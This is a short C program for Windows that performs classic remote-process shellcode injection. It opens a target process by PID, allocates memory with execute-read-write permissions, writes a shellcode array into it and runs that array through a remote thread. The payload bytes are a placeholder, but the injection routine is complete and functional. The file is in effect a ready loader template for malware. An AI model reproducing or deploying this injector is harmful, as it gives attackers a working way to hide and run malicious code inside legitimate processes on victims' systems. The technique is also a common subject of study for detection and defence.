#include <windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL; 

unsigned char sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[])
{
    okay("program startin");
    if (argc < 2)
    {
        info("usage: program.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);


    okay("Getting handle to process (%ld)", PID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL)
    {
        warn("failed to get a handle to process %ld, error: %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got handle 0x%p to process %ld", hProcess, PID);

    /* alloc bytes */
    okay("Allocating buffer on memory of process %ld", PID);
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(sc), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE perm", sizeof(sc));

    /* write allocated mem to process mem */
    WriteProcessMemory(hProcess, rBuffer, sc, sizeof(sc), NULL);
    okay("Wrote %zu bytes to allocated buffer", sizeof(sc));

    /* create thread to run payload */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

    if (hThread == NULL)
    {
        warn("Could not get a handle to the thread created on PID %ld, error:%ld", PID, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("got handle 0x%p to thread %ld", hThread, TID);

    okay("cleanin up...");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    okay("Done!");

    return EXIT_SUCCESS;
}
